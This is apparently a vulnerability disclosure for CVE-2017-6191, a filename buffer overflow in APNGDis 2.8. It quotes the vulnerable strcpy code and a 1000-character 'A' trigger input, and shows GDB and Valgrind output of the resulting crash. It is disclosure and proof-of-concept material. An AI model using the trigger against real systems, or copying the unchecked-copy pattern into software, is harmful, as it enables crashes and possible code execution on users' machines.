@@ -1,0 +1,96 @@
+# Exploit Title: APNGDis filename Buffer Overflow
+# Date: 14-03-2017
+# Exploit Author: Alwin Peppels
+# Vendor Homepage: http://apngdis.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/apngdis/files/2.8/
+# Version: 2.8
+# Tested on: Linux Debian / Windows 7
+# CVE : CVE-2017-6191
+
+Additional analysis:
+https://www.onvio.nl/nieuws/cve-2017-6191-apngdis-filename-buffer-overflow
+
+Textbook buffer overflow; a fixed size buffer gets allocated with
+szPath[256], and the first command line argument is stored without
+validation.
+
+
+int main(int argc, char** argv)
+{
+	unsigned int i, j;
+	char * szInput;
+	char * szOutPrefix;
+	char szPath[256];
+	char szOut[256];
+	std::vector frames;
+	printf("\nAPNG Disassembler 2.8\n\n");
+
+	if (argc > 1)
+		szInput = argv[1];
+	else
+	{
+		printf("Usage: apngdis anim.png [name]\n");
+		return 1;
+	}
+	strcpy(szPath, szInput);
+}
+
+
+
+
+With 'A' * 1000 as argv[1] :
+
+
+GDB:
+
+Program received signal SIGSEGV, Segmentation fault.
+strlen () at ../sysdeps/x86_64/strlen.S:106
+106     ../sysdeps/x86_64/strlen.S: No such file or directory.
+(gdb) i r
+rax            0x4141414141414141       4702111234474983745
+rbx            0x7ffff70ea600   140737338320384
+rcx            0x141    321
+rdx            0x0      0
+rsi            0x7fffffffca40   140737488341568
+rdi            0x4141414141414141       4702111234474983745
+rbp            0x7fffffffceb0   0x7fffffffceb0
+rsp            0x7fffffffc948   0x7fffffffc948
+r8             0x4141414141414141       4702111234474983745
+r9             0x9      9
+r10            0x73     115
+r11            0x7fffffffce78   140737488342648
+r12            0x555555558c9f   93824992251039
+r13            0x7fffffffcec8   140737488342728
+r14            0x0      0
+r15            0xffffffffffffffff       -1
+rip            0x7ffff6dd1486   0x7ffff6dd1486 <strlen+38>
+eflags         0x10297  [ CF PF AF SF IF RF ]
+
+
+Valgrind:
+
+==10685== Invalid read of size 1
+==10685==    at 0x4C2EDA2: strlen (vg_replace_strmem.c:454)
+==10685==    by 0x5B6ADA2: vfprintf (vfprintf.c:1637)
+==10685==    by 0x5B711F8: printf (printf.c:33)
+==10685==    by 0x109F05: load_apng(char*, std::vector<APNGFrame,
+std::allocator<APNGFrame> >&) (apngdis.cpp:200)
+==10685==    by 0x10B24E: main (apngdis.cpp:498)
+==10685==  Address 0x4141414141414141 is not stack'd, malloc'd or
+(recently) free'd
+==10685==
+==10685==
+==10685== Process terminating with default action of signal 11 (SIGSEGV)
+==10685==  General Protection Fault
+==10685==    at 0x4C2EDA2: strlen (vg_replace_strmem.c:454)
+==10685==    by 0x5B6ADA2: vfprintf (vfprintf.c:1637)
+==10685==    by 0x5B711F8: printf (printf.c:33)
+==10685==    by 0x109F05: load_apng(char*, std::vector<APNGFrame,
+std::allocator<APNGFrame> >&) (apngdis.cpp:200)
+==10685==    by 0x10B24E: main (apngdis.cpp:498)
+Reading '==10685==
+==10685== HEAP SUMMARY:
+==10685==     in use at exit: 0 bytes in 0 blocks
+==10685==   total heap usage: 2 allocs, 2 frees, 73,728 bytes allocated
+==10685==
+==10685== All heap blocks were freed -- no leaks are possible
